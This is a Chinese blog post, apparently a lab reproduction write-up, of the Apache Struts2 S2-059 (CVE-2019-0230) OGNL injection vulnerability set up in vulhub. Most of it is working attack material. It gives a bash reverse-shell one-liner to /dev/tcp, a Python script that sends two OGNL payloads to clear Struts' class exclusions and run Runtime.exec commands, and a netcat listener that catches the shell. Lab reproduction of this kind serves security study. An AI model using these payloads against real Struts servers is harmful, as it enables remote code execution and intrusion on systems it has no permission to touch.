# CVE-2019-0230 S2-059 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15659361.html`](https://www.cnblogs.com/peace-and-romance/p/15659361.html)

### 0X00-引言

* * *

study hard and make progress

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

攻击者可以通过构造恶意的 OGNL 表达式，并将其设置到可被外部输入进行修改，且会执行 OGNL 表达式的 Struts2 标签的属性值，引发 OGNL 表达式解析，最终造成远程代码执行的影响。

影响版本: Struts 2.0.0 - Struts 2.5.20

### 0X03-漏洞复现

* * *

`http://192.168.234.128:8080/?id=%25{3*7}`

![image-20211207170809631](img/224e2aa4f4af6e50c55cf5b3e83c59df.png)

##### 01-反弹 shell

`bash -i >& /dev/tcp/IP/port 0>&1`

base64 编码网址：[`www.jackson-t.ca/runtime-exec-payloads.html`](http://www.jackson-t.ca/runtime-exec-payloads.html)

![image-20211207171220495](img/928b6e32ed1726ee8c1063daf385108c.png)

python 脚本：

```
import requests

url = "http://127.0.0.1:8080"
data1 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
}
data2 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"
}
res1 = requests.post(url, data=data1)
# print(res1.text)
res2 = requests.post(url, data=data2)
# print(res2.text) 
```

修改 url

![image-20211207171837411](img/a191a188084a9424076106a27c2a7ba8.png)

修改 data2 中的 exec()中内容，是通过网页 base64 编码的内容

![image-20211207171935851](img/43cd74b060ab1c20c1e03aa31081ca51.png)

先开启监听在执行脚本

`nc -lvvp 1234`

![image-20211207172104367](img/6af37a4ce3ced9143a92620367269ba2.png)

执行脚本

![image-20211207172125405](img/a7abbab83306b183630bb2fc16ca8f03.png)

监听成功

![image-20211207172157080](img/84e57533182127b9bd2dff6eac0e8212.png)

### 0X04-漏洞分析

* * *

略，看懂源码后再搞

### 0X05-参考

* * *

[struts2 s2-059 漏洞复现](https://blog.csdn.net/zy15667076526/article/details/109412342)

[Struts2 S2-059 远程代码执行漏洞(CVE-2019-0230)](https://github.com/vulhub/vulhub/blob/master/struts2/s2-059/README.zh-cn.md)